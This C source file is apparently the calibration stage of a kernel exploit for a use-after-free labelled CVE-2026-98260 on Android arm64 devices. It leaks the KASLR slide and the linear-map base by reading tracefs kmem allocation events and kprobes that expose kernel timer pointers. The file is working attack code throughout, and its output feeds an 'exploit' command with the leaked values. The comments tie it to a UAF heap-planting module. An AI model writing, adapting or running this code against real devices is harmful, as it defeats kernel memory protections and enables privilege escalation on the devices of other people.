/*
 * calib.c - C rewrite of calib_a / calib_b
 *
 * Replaces the shell + python combo in the PC reference implementation:
 *   calib_a: capture_site.sh -> slide_from_timers.py
 *   calib_b: calib.sh -> solve_lmap.py
 *
 * Why calibration is required:
 *   The KASLR slide changes every boot; all kernel addresses in uaf_plant.c are derived from
 *   slide_addr(link) = link + g_slide; when g_slide stays 0, the computed
 *   addresses are all wrong and the UAF layout is guaranteed to fail. page_offset (linear map base) is used for
 *   object_pfn() to convert k_itimer virtual addresses into PFNs, which also must be measured each boot.
 *
 * calib_a principle:
 *   timer_probe creates a batch of CLOCK_THREAD_CPUTIME_ID timers,
 *   do_timer_create() allocates k_itimer from posix_timers_cache.
 *   In kmem_cache_alloc tracepoint records, bytes_req == bytes_alloc ==
 *   sizeof(struct k_itimer) == 0x108, and the call site is fixed at
 *   do_timer_create+0xa8 == TIMER_LINK + slide. Take the most frequent call site
 *   and subtract TIMER_LINK to obtain the slide.
 *
 * calib_b principle:
 *   Within the same window, sample the mm_page_alloc(order=1) PFN set simultaneously (from text trace)
 *   and the k_itimer virtual address set (from raw trace, filtered by call site).
 *   Scan candidate linear map bases L; the correct L makes the PFNs derived from k_itimer's slab pages
 *   hit the order-1 allocation set heavily.
 */

#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernel_table.h"
#include "calib.h"
#include "kernel_offsets.h"
#include "kprobe.h"

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"

/* default candidate k_itimer sizes (PKJ110 6.6.118 and common 6.12.x variants) */
static const uint64_t KITIMER_SIZE_DEFAULTS[] = {0x108, 0x100, 0x110, 0x118};

/* Scan range of solve_lmap.py: PKJ110 DRAM starts at 0x80000000,
 * linear map base = PAGE_OFFSET - 0x80000000, must scan below 0xFFFFFF8000000000 */
#define SCAN_START UINT64_C(0xFFFFFF7E00000000)
#define LMAP_END   UINT64_C(0xFFFFFF8C00000000)
#define SCAN_STEP  UINT64_C(0x200000)

/* per-capture cap to avoid exhausting device memory */
#define PER_CPU_CAP   (16u * 1024u * 1024u)
#define TOTAL_CAP     (64u * 1024u * 1024u)

#define MAX_CPU_RAW 16

int timer_probe_main(int argc, char **argv);

/* ------------------------------------------------------------------ small utilities */

static int write_file(const char *path, const char *text)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;
	size_t len;
	if (fd < 0)
		return -1;
	len = strlen(text);
	n = write(fd, text, len);
	close(fd);
	return n == (ssize_t)len ? 0 : -1;
}

static int truncate_file(const char *path)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | O_TRUNC);
	if (fd < 0)
		return -1;
	close(fd);
	return 0;
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

/*
 * Trigger one rss_stat so the enable_event trigger attached to it takes effect.
 * Consistent with capture_site.sh / calib.sh: rss_stat stays enabled across the whole capture window,
 * and is disabled by calib_disarm() after capture (uaf_plant.c's kick_rss disables it right after kicking).
 */
static void kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
}

static void set_buffer_kb(const char *value)
{
	if (write_file(TRACE "/buffer_size_kb", value))
		fprintf(stdout, "[config] warn: buffer_size_kb=%s not writable, continue\n", value);
}

/*
 * Arm a kmem event deterministically.
 *
 * The reference implementation arms events *indirectly*: it attaches
 * "enable_event:kmem:<name>" to the kmem/rss_stat trigger and then kicks
 * rss_stat by touching a single anonymous page (kick_rss). Whether that arms
 * anything depends on the per-task RSS counter crossing TASK_RSS_EVENTS_THRESH
 * at that instant -- one 4KiB touch only advances the counter by 1, so it is
 * essentially a coin flip on kernels whose counter was just flushed.
 *
 * calib_a/calib_b usually get away with it because rss_stat stays enabled
 * across the whole timer probe (thousands of further RSS bumps), but the
 * short-lived capture in uaf_plant.c (leak_task) gets exactly one
 * kick and no further RSS growth, so they end up with zero records. Observed
 * reproducibly on Xiaomi 6.6.118-android15-8-g0908354dac1b:
 *     [task] hits=0 foreign=0 task=0  ->  [task] leak failed
 *
 * Prefer the direct write to events/kmem/<name>/enable; keep the trigger only
 * as a fallback for ROMs that refuse the direct write.
 */
static int arm_kmem_event(const char *name)
{
	char path[192];

	snprintf(path, sizeof(path), TRACE "/events/kmem/%s/enable", name);
	if (!write_file(path, "1\n")) {
		fprintf(stdout, "[config] armed %s directly\n", name);
		return 0;
	}
	snprintf(path, sizeof(path), "enable_event:kmem:%s\n", name);
	if (!trigger_cmd(path))
		return 0;
	return -1;
}

static void calib_disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "0\n");
	write_file(TRACE "/events/kmem/mm_page_alloc/enable", "0\n");
	write_file(TRACE "/events/kmem/mm_page_free/enable", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
}

static uint64_t now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (uint64_t)ts.tv_sec * 1000u + (uint64_t)(ts.tv_nsec / 1000000);
}

/*
 * 结果直接打印到终端，不再落盘：等号框便于在滚屏里定位，框宽按最长一行
 * 自适应，最后一行 NEXT 是可以整行复制执行的下一条命令。
 */
#define RULE_MAX 78	/* 框宽上限：长 next 命令不再把等号线拉满整屏 */

static void print_result_block(const char *title, const char *const *lines, size_t n)
{
	char bar[RULE_MAX + 1];
	size_t width = strlen(title) + 4;
	size_t i;

	for (i = 0; i < n; i++) {
		size_t len = strlen(lines[i]) + 2;
		if (len > width)
			width = len;
	}
	if (width > RULE_MAX)
		width = RULE_MAX;
	memset(bar, '=', width);
	bar[width] = '\0';

	printf("\n%s\n  %s\n%s\n", bar, title, bar);
	for (i = 0; i < n; i++)
		printf("  %s\n", lines[i]);
	printf("%s\n\n", bar);
	fflush(stdout);
}

/*
 * auto（一条龙）用：两个报告函数顺手把值留下来，供 main.c 在 fork 出的子进程里
 * 取回并回传父进程。单步 CLI 行为不变，值仍然照常打印。
 */
static uint64_t g_last_slide;
static int g_last_slide_valid;
static uint64_t g_last_page_offset;
static int g_last_page_offset_fallback;

uint64_t calib_last_slide(void)
{
	return g_last_slide;
}

/*
 * slide 的合法值包含 0（KASLR 关闭，或本次随机到 0），不能用 !slide 判断
 * “没拿到值”，必须用这个标志。
 */
int calib_last_slide_valid(void)
{
	return g_last_slide_valid;
}

uint64_t calib_last_page_offset(void)
{
	return g_last_page_offset;
}

int calib_last_page_offset_fallback(void)
{
	return g_last_page_offset_fallback;
}

/* calibrate-a 的醒目输出：slide + 下一条命令 */
static void report_slide(uint64_t slide)
{
	char slide_line[64], text_line[96], next_line[512];
	const char *lines[4];

	g_last_slide = slide;
	g_last_slide_valid = 1;
	snprintf(slide_line, sizeof(slide_line), "slide = 0x%llx",
		 (unsigned long long)slide);
	snprintf(text_line, sizeof(text_line), "_text = 0x%llx",
		 (unsigned long long)(UINT64_C(0xFFFFFFC080000000) + slide));
	snprintf(next_line, sizeof(next_line),
		 "next: %s calibrate-b --slide 0x%llx",
		 g_prog_path, (unsigned long long)slide);
	lines[0] = slide_line;
	lines[1] = text_line;
	lines[2] = "";
	lines[3] = next_line;
	print_result_block("CVE-2026-98260 calibrate-a OK", lines, 4);
}

/* calibrate-b 的醒目输出：page_offset + 下一条命令（fallback 时明确标注不可靠） */
static void report_page_offset(uint64_t base, uint64_t score, size_t total,
			       const char *slide_str, int fallback)
{
	char base_line[64], score_line[96], next_line[640];
	char score_text[64];
	const char *lines[4];

	g_last_page_offset = base;
	g_last_page_offset_fallback = fallback;

	if (fallback)
		snprintf(score_text, sizeof(score_text), "n/a (fallback)");
	else
		snprintf(score_text, sizeof(score_text), "%llu/%zu",
			 (unsigned long long)score, total);

	snprintf(base_line, sizeof(base_line), "page_offset = 0x%llx",
		 (unsigned long long)base);
	snprintf(score_line, sizeof(score_line), "score       = %s", score_text);
	snprintf(next_line, sizeof(next_line),
		 "next: %s exploit --slide %s --page-offset 0x%llx --daemon-exit",
		 g_prog_path,
		 slide_str ? slide_str : "<calibrate-a 打印的 slide>",
		 (unsigned long long)base);

	lines[0] = base_line;
	lines[1] = score_line;
	lines[2] = "";
	lines[3] = next_line;
	print_result_block(fallback
		? "CVE-2026-98260 calibrate-b FALLBACK (profile 默认值, 不可靠)"
		: "CVE-2026-98260 calibrate-b OK", lines, 4);
}

/* -------------------------------------------------- raw trace capture (equivalent to: timeout N dd) */

struct raw_sink {
	size_t len;
	size_t alloc;
	size_t cap;
	uint8_t *buf;
};

/*
 * E2：分配失败返回 -1。
 *
 * 原实现只赋值不检查，两个调用点各自补了一个 `if (!sink.buf)` 兜底——能工作，
 * 但把「必须判空」的约定藏在了调用方。这里把契约显式化（返回码），两个调用点
 * 改为检查返回值，避免以后新增调用点忘记判空。
 */
static int sink_init(struct raw_sink *s, size_t cap)
{
	s->len = 0;
	s->alloc = 1u << 20;
	s->cap = cap;
	s->buf = malloc(s->alloc);
	return s->buf ? 0 : -1;
}

static int sink_reserve(struct raw_sink *s, size_t need)
{
	if (s->len + need <= s->alloc)
		return 0;
	if (s->len >= s->cap)
		return -1;
	while (s->alloc < s->len + need)
		s->alloc *= 2;
	if (s->alloc > s->cap)
		s->alloc = s->cap;
	{
		uint8_t *p = realloc(s->buf, s->alloc);
		if (!p)
			return -1;
		s->buf = p;
	}
	return 0;
}

/* child process: blocking-read the raw pipe and write to pipe (equiv: dd if=... bs=65536) */
static void capture_child(const char *path, int wfd)
{
	int in = open(path, O_RDONLY);
	char buf[65536];
	if (in < 0)
		_exit(1);
	for (;;) {
		ssize_t n = read(in, buf, sizeof(buf));
		if (n < 0) {
			if (errno == EINTR)
				continue;
			break;
		}
		if (n == 0)
			break;
		if (write(wfd, buf, (size_t)n) != n)
			break;
	}
	close(in);
	_exit(0);
}

/* parent: collect with timeout, SIGKILL the child on timeout (equiv: timeout N dd ... &) */
static void capture_raw(struct raw_sink *sink, const char *const *paths,
			int npaths, int seconds)
{
	int fds[MAX_CPU_RAW];
	pid_t pids[MAX_CPU_RAW];
	struct pollfd pfds[MAX_CPU_RAW];
	int n = 0;
	uint64_t deadline;
	int i;

	if (!sink->buf)
		return;
	deadline = now_ms() + (uint64_t)seconds * 1000u;

	for (i = 0; i < npaths && n < MAX_CPU_RAW; i++) {
		int pipe_fd[2];
		pid_t pid;
		if (access(paths[i], R_OK) != 0)
			continue;
		if (pipe(pipe_fd))
			continue;
		pid = fork();
		if (pid == 0) {
			close(pipe_fd[0]);
			capture_child(paths[i], pipe_fd[1]);
			_exit(1);
		}
		close(pipe_fd[1]);
		if (pid < 0) {
			close(pipe_fd[0]);
			continue;
		}
		fds[n] = pipe_fd[0];
		pids[n] = pid;
		n++;
	}
	if (n == 0) {
		fprintf(stderr, "[config] warn: no usable trace_pipe_raw\n");
		return;
	}

	while (now_ms() < deadline && sink->len < sink->cap) {
		uint64_t remain = deadline - now_ms();
		int wait_ms = remain > 200u ? 200 : (int)remain;
		int ready;
		for (i = 0; i < n; i++) {
			pfds[i].fd = fds[i];
			pfds[i].events = POLLIN;
			pfds[i].revents = 0;
		}
		ready = poll(pfds, (nfds_t)n, wait_ms);
		if (ready < 0) {
			if (errno == EINTR)
				continue;
			break;
		}
		if (ready == 0)
			continue;
		for (i = 0; i < n; i++) {
			ssize_t got;
			if (fds[i] < 0 || !(pfds[i].revents & POLLIN))
				continue;
			if (sink_reserve(sink, 65536))
				break;
			got = read(fds[i], sink->buf + sink->len, sink->alloc - sink->len);
			if (got < 0) {
				if (errno == EINTR || errno == EAGAIN)
					continue;
				close(fds[i]);
				fds[i] = -1;
				continue;
			}
			if (got == 0) {
				close(fds[i]);
				fds[i] = -1;
				continue;
			}
			sink->len += (size_t)got;
		}
	}

	for (i = 0; i < n; i++) {
		int st;
		if (fds[i] >= 0)
			close(fds[i]);
		kill(pids[i], SIGKILL);
		while (waitpid(pids[i], &st, 0) < 0 && errno == EINTR) {
		}
	}
}

/* The pure-compute parts of record scanning and lmap solving live in calib_core.c (host unit-testable) */

/* local u64 comparator (pure-compute version in calib_core.c) */
static int cmp_u64_local(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}

/* ------------------------------------------------------------------ calib_a */

int calib_a_main(int argc, char **argv)
{
	if (KO_TIMER_ALLOC_PROBE_OFF) {
		/* nezha 方法：kprobe __arm64_sys_getpid 读 %pc，直接得 slide，
		 * 不依赖 timer_link / call_site（绕开 do_timer_create 内联脆弱性）。 */
		uint64_t slide;

		fprintf(stdout, "[calib_a] using kprobe (KO_TIMER_ALLOC_PROBE_OFF != 0) slide path\n");
		if (kprobe_measure_slide(&slide)) {
			fprintf(stderr, "[calib_a] error: kprobe slide measurement failed\n");
			return 1;
		}
		report_slide(slide);
		return 0;
	}

	const struct kernel_offsets *o = kernel_table_get();
	uint64_t sizes[8]; size_t n_sizes = 0;
	if (o->kitimer_size) sizes[n_sizes++] = o->kitimer_size;
	for (size_t ci = 0; ci < sizeof(KITIMER_SIZE_DEFAULTS)/sizeof(KITIMER_SIZE_DEFAULTS[0]); ci++) {
		uint64_t d = KITIMER_SIZE_DEFAULTS[ci]; int dup = 0;
		for (size_t j = 0; j < n_sizes; j++) if (sizes[j] == d) { dup = 1; break; }
		if (!dup) sizes[n_sizes++] = d;
	}
	uint64_t timer_link = o ? o->timer_link : 0;
	struct raw_sink sink;
	const char *paths[1];
	uint64_t *sites = NULL;
	size_t n_sites = 0;
	struct calib_run top[8];
	size_t n_top, i;
	char n_str[32], hold_str[32];
	char *probe_argv[4];
	int rc = 1;
	uint64_t slide = 0;
	int found = 0;

	if (!timer_link) {
		fprintf(stderr, "[calib_a] error: profile missing timer_link\n");
		return 1;
	}

	snprintf(n_str, sizeof(n_str), "%d", argc > 1 ? atoi(argv[1]) : 2048);
	snprintf(hold_str, sizeof(hold_str), "%d", argc > 2 ? atoi(argv[2]) : 2);

	fprintf(stdout, "[calib_a] collecting call sites (timer_link=%#llx, probe %s / hold %ss)\n",
		(unsigned long long)timer_link, n_str, hold_str);

	calib_disarm();
	set_buffer_kb("16384\n");
	truncate_file(TRACE "/trace");
	if (arm_kmem_event("kmem_cache_alloc")) {
		fprintf(stderr, "[calib_a] error: cannot arm kmem_cache_alloc (tracefs not writable?)\n");
		calib_disarm();
		return 1;
	}
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n")) {
		fprintf(stderr, "[calib_a] error: cannot enable kmem/rss_stat\n");
		calib_disarm();
		return 1;
	}
	kick_rss();
	truncate_file(TRACE "/trace");
	write_file(TRACE "/tracing_on", "1\n");

	probe_argv[0] = (char *)"timer_probe";
	probe_argv[1] = n_str;
	probe_argv[2] = hold_str;
	probe_argv[3] = NULL;
	if (timer_probe_main(3, probe_argv)) {
		/*
		 * 一个 timer 都没建出来时必须失败。否则接下来扫到的全是系统里
		 * 其它进程的 kmem 记录，会算出一个看起来像样、实际完全错误的
		 * slide（实测 probe=0 时得到 0x2de16a24d0，_text 落到 vmalloc 区）。
		 */
		fprintf(stderr, "[calib_a] error: timer probe failed (n=%s), refusing to derive slide from foreign records\n", n_str);
		calib_disarm();
		return 1;
	}

	write_file(TRACE "/tracing_on", "0\n");
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");

	paths[0] = TRACE "/per_cpu/cpu0/trace_pipe_raw";
	if (sink_init(&sink, PER_CPU_CAP)) {
		fprintf(stderr, "[calib_a] error: out of memory\n");
		return 1;
	}
	capture_raw(&sink, paths, 1, 5);
	fprintf(stdout, "[calib_a] captured raw=%zu bytes\n", sink.len);

	sites = calib_scan_kitimer(sink.buf, sink.len, 0, 1, 0, sizes, n_sizes, &n_sites);
	if (!sites || !n_sites) {
		fprintf(stdout, "[calib_a] error: no k_itimer records found (multi-size probe)\n");
		goto out;
	}

	n_top = calib_top_values(sites, n_sites, top, 8);
	fprintf(stdout, "[calib_a] candidate call sites: %zu\n", n_top);
	for (i = 0; i < n_top; i++) {
		uint64_t s = top[i].value - timer_link;
		int ok = (top[i].value >= timer_link) &&
			 (s < (UINT64_C(1) << 42));
		if (ok && (s % SCAN_STEP))
			fprintf(stdout, "[calib_a] note: slide not 2MiB-aligned (%#llx), keep as candidate\n",
				(unsigned long long)s);
		fprintf(stdout, "[calib_a]   site=%#llx count=%d slide=%#llx%s\n",
			(unsigned long long)top[i].value, top[i].count,
			(unsigned long long)s, ok ? "" : " (implausible)");
		if (ok && !found) {
			slide = s;
			found = 1;
			if (top[i].count < 64)
				fprintf(stdout, "[calib_a] warn: weak support samples (%d), result may be unstable\n",
					top[i].count);
		}
	}

	if (!found) {
		fprintf(stderr, "[calib_a] error: no plausible slide candidate\n");
		goto out;
	}

	report_slide(slide);
	rc = 0;

out:
	free(sites);
	free(sink.buf);
	if (rc == 0)
		fprintf(stdout, "[calib_a] done\n");
	return rc;
}

/* ------------------------------------------------------------------ calib_b */

/* extract mm_page_alloc order=1 PFNs from text trace (equiv: calib.sh grep+sed) */
static int collect_order1_pfns(uint64_t **out, size_t *out_n)
{
	FILE *f = fopen(TRACE "/trace", "r");
	char line[8192];
	size_t cap = 4096, n = 0;
	uint64_t *arr;

	*out = NULL;
	*out_n = 0;
	if (!f) {
		fprintf(stderr, "[calib_b] error: cannot read " TRACE "/trace\n");
		return -1;
	}
	arr = malloc(cap * sizeof(*arr));
	if (!arr) {
		fclose(f);
		return -1;
	}
	while (fgets(line, sizeof(line), f)) {
		char *p;
		unsigned long long v = 0;
		if (!strstr(line, "mm_page_alloc"))
			continue;
		p = strstr(line, "order=1");
		if (!p)
			continue;
		/* exclude false matches like order=10.. (aligns with reference impl grep "order=1" semantics) */
		if (p[7] >= '0' && p[7] <= '9')
			continue;
		p = strstr(line, "pfn=");
		if (!p)
			continue;
		if (sscanf(p + 4, "%llx", &v) != 1)
			continue;
		if (n == cap) {
			uint64_t *q = realloc(arr, (cap * 2) * sizeof(*arr));
			if (!q)
				break;
			cap *= 2;
			arr = q;
		}
		arr[n++] = (uint64_t)v;
	}
	fclose(f);
	qsort(arr, n, sizeof(*arr), cmp_u64_local);
	*out = arr;
	*out_n = n;
	return 0;
}

/* resolve slide from the command line only: --slide <hex> */
static int resolve_slide(int argc, char **argv, uint64_t *out)
{
	int i;

	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc) {
			*out = strtoull(argv[++i], NULL, 0);
			return 0;
		}
	}
	return -1;
}

int calib_b_main(int argc, char **argv)
{
	if (KO_TIMER_ALLOC_PROBE_OFF) {
		/* nezha 方法：timer 指针用 kprobe do_timer_create+<off> 读 %x19 批量获取，
		 * 不再解析 raw trace；order-1 PFN 仍从 mm_page_alloc 文本 trace 读，
		 * page_offset 求解逻辑（calib_pages_from_ptrs + calib_solve_lmap）不变。 */
		const struct kernel_offsets *ko = kernel_table_get();
		const uint64_t k_default = ko ? ko->page_offset
					      : UINT64_C(0xffffff7f80000000);
		uint64_t *k_ptrs = NULL, *k_pfns = NULL, *k_pages = NULL;
		size_t k_n_ptrs = 0, k_n_pfns = 0, k_n_pages = 0;
		uint64_t k_base = 0, k_score = 0;
		int k_probe_n = 4096;
		int k_got = 0;

		for (int ai = 1; ai < argc; ai++) {
			if (!strcmp(argv[ai], "--probe-n") && ai + 1 < argc)
				k_probe_n = atoi(argv[++ai]);
		}

		calib_disarm();
		set_buffer_kb("65536\n");
		truncate_file(TRACE "/trace");
		if (arm_kmem_event("mm_page_alloc")) {
			fprintf(stderr, "[calib_b] error: cannot arm mm_page_alloc\n");
			return 1;
		}
		if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n")) {
			fprintf(stderr, "[calib_b] error: cannot enable kmem/rss_stat\n");
			calib_disarm();
			return 1;
		}
		kick_rss();
		truncate_file(TRACE "/trace");

		k_ptrs = malloc((size_t)k_probe_n * sizeof(uint64_t));
		if (!k_ptrs) {
			calib_disarm();
			return 1;
		}
		if (kprobe_leak_timer_ptrs(k_ptrs, k_probe_n, &k_got)) {
			fprintf(stderr, "[calib_b] error: kprobe timer leak failed\n");
			free(k_ptrs);
			calib_disarm();
			return 1;
		}
		k_n_ptrs = (size_t)k_got;
		fprintf(stdout, "[calib_b] kprobe leaked %zu timer ptrs\n", k_n_ptrs);

		if (collect_order1_pfns(&k_pfns, &k_n_pfns)) {
			fprintf(stderr, "[calib_b] error: cannot collect order-1 pfns\n");
			free(k_ptrs);
			calib_disarm();
			return 1;
		}
		calib_disarm();
		fprintf(stdout, "[calib_b] order1_pfns=%zu\n", k_n_pfns);

		k_pages = malloc(k_n_ptrs * sizeof(uint64_t));
		if (!k_pages) {
			free(k_ptrs);
			free(k_pfns);
			return 1;
		}
		k_n_pages = calib_pages_from_ptrs(k_ptrs, k_n_ptrs, k_pages);
		fprintf(stdout, "[calib_b] k_itimer=%zu slab_pages=%zu\n",
			k_n_ptrs, k_n_pages);

		if (!k_n_pages || !k_n_pfns) {
			fprintf(stderr, "[calib_b] error: insufficient samples\n");
			goto kprobe_fallback;
		}
		k_base = calib_solve_lmap(k_pages, k_n_pages, k_pfns, k_n_pfns, &k_score);
		if (!k_score) {
			fprintf(stderr, "[calib_b] error: no candidate base hits the order-1 set\n");
			goto kprobe_fallback;
		}

		report_page_offset(k_base, k_score, k_n_pages, NULL, 0);
		free(k_pages); free(k_ptrs); free(k_pfns);
		fprintf(stdout, "[calib_b] done\n");
		return 0;

kprobe_fallback:
		report_page_offset(k_default, 0, 0, NULL, 1);
		free(k_pages); free(k_ptrs); free(k_pfns);
		return 1;
	}

	const struct kernel_offsets *o = kernel_table_get();
	uint64_t sizes[8]; size_t n_sizes = 0;
	if (o->kitimer_size) sizes[n_sizes++] = o->kitimer_size;
	for (size_t ci = 0; ci < sizeof(KITIMER_SIZE_DEFAULTS)/sizeof(KITIMER_SIZE_DEFAULTS[0]); ci++) {
		uint64_t d = KITIMER_SIZE_DEFAULTS[ci]; int dup = 0;
		for (size_t j = 0; j < n_sizes; j++) if (sizes[j] == d) { dup = 1; break; }
		if (!dup) sizes[n_sizes++] = d;
	}
	uint64_t timer_link = o ? o->timer_link : 0;
	uint64_t page_offset_default = o ? o->page_offset
					 : UINT64_C(0xffffff7f80000000);
	uint64_t slide = 0, site_link, best_base = 0, best_score = 0;
	struct raw_sink sink;
	const char *paths[MAX_CPU_RAW];
	char path_buf[MAX_CPU_RAW][64];
	int npaths = 0, cpu;
	uint64_t *ptrs = NULL, *pfns = NULL, *pages = NULL;
	size_t n_ptrs = 0, n_pfns = 0, n_pages = 0;
	char n_str[32], hold_str[32];
	char *probe_argv[4];
	int i;

	if (!timer_link) {
		fprintf(stderr, "[calib_b] error: profile missing timer_link\n");
		return 1;
	}
	if (resolve_slide(argc, argv, &slide)) {
		fprintf(stderr, "[calib_b] error: slide missing, pass --slide <hex> "
			"(use the value printed by calibrate-a)\n");
		return 1;
	}
	site_link = timer_link + slide;
	fprintf(stdout, "[calib_b] slide=%#llx expected call site=%#llx\n",
		(unsigned long long)slide, (unsigned long long)site_link);

	snprintf(n_str, sizeof(n_str), "%d", 4096);
	snprintf(hold_str, sizeof(hold_str), "%d", 1);
	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--probe-n") && i + 1 < argc)
			snprintf(n_str, sizeof(n_str), "%d", atoi(argv[++i]));
		else if (!strcmp(argv[i], "--probe-hold") && i + 1 < argc)
			snprintf(hold_str, sizeof(hold_str), "%d", atoi(argv[++i]));
	}

	calib_disarm();
	set_buffer_kb("65536\n");
	truncate_file(TRACE "/trace");
	if (arm_kmem_event("kmem_cache_alloc") ||
	    arm_kmem_event("mm_page_alloc")) {
		fprintf(stderr, "[calib_b] error: cannot arm kmem_cache_alloc / mm_page_alloc\n");
		return 1;
	}
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n")) {
		fprintf(stderr, "[calib_b] error: cannot enable kmem/rss_stat\n");
		calib_disarm();
		return 1;
	}
	kick_rss();
	truncate_file(TRACE "/trace");
	write_file(TRACE "/tracing_on", "1\n");

	probe_argv[0] = (char *)"timer_probe";
	probe_argv[1] = n_str;
	probe_argv[2] = hold_str;
	probe_argv[3] = NULL;
	timer_probe_main(3, probe_argv);

	write_file(TRACE "/tracing_on", "0\n");
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");

	/* order=1 PFNs come from text trace (pfn is not hashed there) */
	if (collect_order1_pfns(&pfns, &n_pfns)) {
		calib_disarm();
		return 1;
	}
	fprintf(stdout, "[calib_b] order1_pfns=%zu\n", n_pfns);

	/* k_itimer virtual addresses come from each CPU's raw pipe, captured concurrently (probe may run on any CPU) */
	for (cpu = 0; cpu < MAX_CPU_RAW; cpu++) {
		snprintf(path_buf[cpu], sizeof(path_buf[cpu]),
			 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		paths[cpu] = path_buf[cpu];
		npaths++;
	}
	if (sink_init(&sink, TOTAL_CAP)) {
		fprintf(stderr, "[calib_b] error: out of memory\n");
		free(pfns);
		calib_disarm();
		return 1;
	}
	capture_raw(&sink, paths, npaths, 8);
	calib_disarm();
	fprintf(stdout, "[calib_b] raw=%zu bytes\n", sink.len);

	ptrs = calib_scan_kitimer(sink.buf, sink.len, site_link, 0, 1, sizes, n_sizes, &n_ptrs);
	if (!ptrs || !n_ptrs) {
		fprintf(stderr, "[calib_b] error: no matching k_itimer records (slide may be wrong)\n");
		goto fallback;
	}

	/* dedupe + take slab pages aligned to 8K (order-1 = 2 pages = 8KB) */
	pages = malloc(n_ptrs * sizeof(uint64_t));
	if (!pages)
		goto fallback;
	n_pages = calib_pages_from_ptrs(ptrs, n_ptrs, pages);
	fprintf(stdout, "[calib_b] k_itimer=%zu slab_pages=%zu\n", n_ptrs, n_pages);

	if (!n_pages || !n_pfns) {
		fprintf(stderr, "[calib_b] error: insufficient samples\n");
		goto fallback;
	}

	best_base = calib_solve_lmap(pages, n_pages, pfns, n_pfns, &best_score);
	if (!best_score) {
		fprintf(stderr, "[calib_b] error: no candidate base hits the order-1 set\n");
		goto fallback;
	}

	{
		char slide_str[32];
		snprintf(slide_str, sizeof(slide_str), "0x%llx",
			 (unsigned long long)slide);
		report_page_offset(best_base, best_score, n_pages, slide_str, 0);
	}
	free(pages);
	free(ptrs);
	free(pfns);
	free(sink.buf);
	fprintf(stdout, "[calib_b] done\n");
	return 0;

fallback:
	{
		char slide_str[32];
		snprintf(slide_str, sizeof(slide_str), "0x%llx",
			 (unsigned long long)slide);
		report_page_offset(page_offset_default, 0, 0, slide_str, 1);
	}
	free(pages);
	free(ptrs);
	free(pfns);
	free(sink.buf);
	return 1;
}
